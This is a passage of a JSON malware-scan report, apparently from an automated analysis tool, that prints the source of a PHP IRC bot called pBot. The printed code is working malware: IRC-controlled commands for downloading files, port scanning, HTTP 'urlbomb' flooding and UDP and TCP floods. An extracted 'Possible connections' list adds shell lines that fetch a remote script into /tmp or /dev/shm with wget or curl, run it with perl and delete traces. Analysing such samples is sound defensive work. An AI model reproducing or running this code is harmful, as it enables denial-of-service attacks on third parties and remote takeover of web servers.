            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor( $i=0; $i <= count( $get ); $i++ ) ",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{ ",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfwrite( $fp, $get[ $i ] ); ",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ),\"[ download ] URL [\".$mcmd[ 1 ].\"] to [\".$mcmd[ 2 ].\"]\");",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\tfclose( $fp );",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ download ] Invalid Parameters, idiot!\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"pmsg\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$person = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$text = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ pmsg ] \".$person.\" => \".$text );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $person, $text );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"pscan\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$host = $mcmd[1];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$beginport = $mcmd[2];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$endport = $mcmd[3];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$open_ports = \"Open Port List for \".$host.\": \";",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\tfor($i = $beginport; $i < $endport; $i++)",
            "\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\tif( $this->scanport( $host, $i ) )",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t$open_ports .= \"|\".$i;",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), $open_ports );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"software\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), $_SERVER[ 'SERVER_SOFTWARE' ] );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"snf\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'nickform' ] = $mcmd[ 1 ];",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"Nickname format set to [ \".$mcmd[ 1 ].\" ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"randnick\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->set_nick();",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"unauth\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->remove_auth( $host );",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ auth ] Logout [ \".$nick.\" ]\" );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\tcase \"urlbomb\":",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t\t\t\t$this->urlbomb( $mcmd[ 1 ], $mcmd[ 2 ], $mcmd[ 3 ] );",
            "\t\t\t\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "                            \t\t\t\tcase \"udpflood\": ",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "                               \t\t\t\t\tif( count( $mcmd ) > 3 ) ",
            "                               \t\t\t\t\t{",
            "                                  \t\t\t\t\t$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); ",
            "                               \t\t\t\t\t} ",
            "                            \t\t\t\t\tbreak; ",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "                            \t\t\t\tcase \"tcpflood\": ",
            "\t\t\t\t\t\t\t\t\t\t\t{",
            "                               \t\t\t\t\tif( count( $mcmd ) > 5 ) ",
            "                               \t\t\t\t\t{ ",
            "                                 \t\t\t\t\t$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); ",
            "                               \t\t\t\t\t} ",
            "                            \t\t\t\t\tbreak; ",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t} ",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t} ",
            "\t\t\t\t\t\t\tbreak; ",
            "\t\t\t\t\t\t} ",
            "\t\t\t\t\t} ",
            "\t\t\t\t} ",
            "\t\t\t\t$old_buf = $this->buf; ",
            "\t\t\t} ",
            "\t\t\t$this->start(); ",
            "\t\tfunction scanport( $host, $port )",
            "\t\t\tif( fsockopen( $host, $port, $e, $s ) )",
            "\t\t\t{",
            "\t\t\t\treturn 1;",
            "\t\t\t}",
            "\t\t\treturn 0;",
            "\t\tfunction urlbomb( $host, $path, $times, $mode = 0 )",
            "\t\t\tif( !isset( $host ) || !isset( $path ) || !isset( $times ) )",
            "\t\t\t\treturn;",
            "\t\t\t$this->privmsg( $this->get_chan( ), '[ urlbomb ] started! [ '.$host.'/'.$path.' ]' );",
            "\t\t\t$success = 0;",
            "\t\t\tfor( $i = 0; $i < $times; $i++ )",
            "\t\t\t{",
            "\t\t\t\t$fp = fsockopen( $host, 80, $errno, $errstr, 30 );",
            "\t\t\t\tif( $fp )",
            "\t\t\t\t{",
            "\t\t\t\t\t$out = \"GET /\".$path.\" HTTP/1.1\\r\\n\";",
            "\t\t\t\t\t$out .= \"Host: \".$host.\"\\r\\n\";",
            "\t\t\t\t\t$out .= \"Keep-Alive: 300\\r\\n\";",
            "\t\t\t\t\t$out .= \"Connection: keep-alive\\r\\n\\r\\n\";",
            "\t\t\t\t\tfwrite( $fp, $out );",
            "\t\t\t\t\tif( $mode != 0 )",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\twhile(!feof($fp)){/*do nothing*/}",
            "\t\t\t\t\t}",
            "\t\t\t\t\t",
            "\t\t\t\t\tfclose( $fp );",
            "\t\t\t\t\t",
            "\t\t\t\t\t$success++;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\t$this->privmsg( $this->get_chan( ), '[ urlbomb ] finished! [ '.$host.'/'.$path.' ][ success: '.$success.' ]' );",
            "\t\tfunction udpflood( $host, $packetsize, $time ) ",
            "\t\t\t$this->privmsg( $this->get_chan( ),\"[ udpflood ] Started [\".$host.\"]\" ); ",
            "\t\t\t$packet = \"\";",
            "\t\t\tfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }",
            "\t\t\t$timei = time();",
            "\t\t\t$i = 0;",
            "\t\t\twhile(time()-$timei < $time) ",
            "\t\t\t{",
            "\t\t\t\t$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);",
            "\t\t\t\tfwrite($fp,$packet);",
            "\t\t\t\tfclose($fp);",
            "\t\t\t\t$i++;",
            "\t\t\t}",
            "\t\t\t$env = $i * $packetsize;",
            "\t\t\t$env = $env / 1048576;",
            "\t\t\t$vel = $env / $time;",
            "\t\t\t$vel = round($vel);",
            "\t\t\t$env = round($env);",
            "\t\t\t$this->privmsg( $this->get_chan( ),\"[ udpflood ] $env MB Sent / $vel MB/s \");",
            "\t\tfunction tcpflood($host,$packets,$packetsize,$port,$delay) ",
            "\t\t{ ",
            "\t\t\t$this->privmsg( $this->get_chan( ),\"[\\2TcpFlood Started!\\2]\"); ",
            "\t\t\t$packet = \"\"; ",
            "\t\t\tfor($i=0;$i<$packetsize;$i++) ",
            "\t\t\t\t$packet .= chr(mt_rand(1,256)); ",
            "\t\t\tfor($i=0;$i<$packets;$i++) ",
            "\t\t\t{ ",
            "\t\t\t\tif(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5)) ",
            "\t\t\t  \t{ ",
            "\t\t\t\t\t$this->privmsg( $this->get_chan( ),\"[\\2TcpFlood\\2]: Error: <$e>\"); ",
            "\t\t\t\t  \treturn 0; ",
            "\t\t\t   \t} ",
            "\t\t\t   \telse ",
            "\t\t\t   \t{ ",
            "\t\t\t\t\tfwrite($fp,$packet); ",
            "\t\t\t\t\tfclose($fp); ",
            "\t\t\t\t} ",
            "\t\t\t   \tsleep($delay); ",
            "\t\t\t} ",
            "\t\t\t$this->privmsg( $this->get_chan( ),\"[\\2TcpFlood Finished!\\2]: Config - $packets for $host:$port.\"); ",
            "\t\tfunction send($msg) ",
            "\t\t{ ",
            "\t\t\tfwrite($this->conn,\"$msg\\r\\n\"); ",
            "\t\t} ",
            "\t\tfunction join($chan,$key=NULL) ",
            "\t\t{ ",
            "\t\t\t$this->send(\"JOIN $chan $key\"); ",
            "\t\t} ",
            "\t\tfunction privmsg($to,$msg)",
            "\t\t\t$this->send(\"PRIVMSG $to :$msg\");",
            "\t\tfunction notice($to,$msg)",
            "\t\t\t$this->send(\"NOTICE $to :$msg\");",
            "\t\t function set_nick() ",
            "\t\t { ",
            "\t\t\t$prefix = \"[C]\";",
            "\t\t\tif(isset($_SERVER['SERVER_SOFTWARE']))",
            "\t\t\t{ ",
            "\t\t\t\tif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), \"apache\" ) )",
            "\t\t\t\t\t$prefix = \"[A]\"; ",
            "\t\t\t\telseif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), \"iis\" ) ) ",
            "\t\t\t\t\t$prefix = \"[I]\"; ",
            "\t\t\t\telseif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), \"xitami\" ) ) ",
            "\t\t\t\t\t$prefix = \"[X]\"; ",
            "\t\t\t\telse ",
            "\t\t\t\t\t$prefix = \"[U]\"; ",
            "\t\t\t}",
            "\t\t\tif( !$this->is_safe( ) )",
            "\t\t\t{",
            "\t\t\t\t$prefix .= \"[S]\";",
            "\t\t\t}",
            "\t\t\t$random_number = \"\";",
            "\t\t\tfor( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )",
            "\t\t\t{",
            "\t\t\t\t$random_number .= mt_rand( 0, 9 ); ",
            "\t\t\t}",
            "\t\t\t$this->nick = sprintf( $prefix.$this->config[ 'nickform' ], $random_number );",
            "\t\t\t$this->send(\"NICK \".$this->nick);",
            "\t\t }",
            "\t\tfunction parse_url_s( $url )",
            "\t\t\t$URLpcs = ( parse_url( $url ) );",
            "\t\t\t$PathPcs = explode( \"/\", $URLpcs['path'] );",
            "\t\t\t$URLpcs['file'] = end( $PathPcs );",
            "\t\t\tunset( $PathPcs[ key( $PathPcs ) ] );",
            "\t\t\t$URLpcs['dir'] = implode(\"/\",$PathPcs);",
            "\t\t\t$fileext = explode( '.', $URLpcs['file'] );",
            "\t\t\tif(count($fileext))",
            "\t\t\t{",
            "\t\t\t\t$URLpcs['file_ext'] = $fileext[ count( $fileext ) - 1 ];",
            "\t\t\t}",
            "\t\t\treturn ($URLpcs);",
            "\t$bot = new pBot; ",
            "\t$bot->start(); "
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
                "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /tmp;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
                "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');",
                "\t\t\t\t\t\t\t\t\t\t\t\t\t$this->ex('cd /dev/shm;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');"
            ]
        },
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://ws.arin.net/whois/?queryinput=127.0.0.1",
            "http://",
            "ftp://user:password@host.com"
        ]
    },
    "time": "0:00:00.424964",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
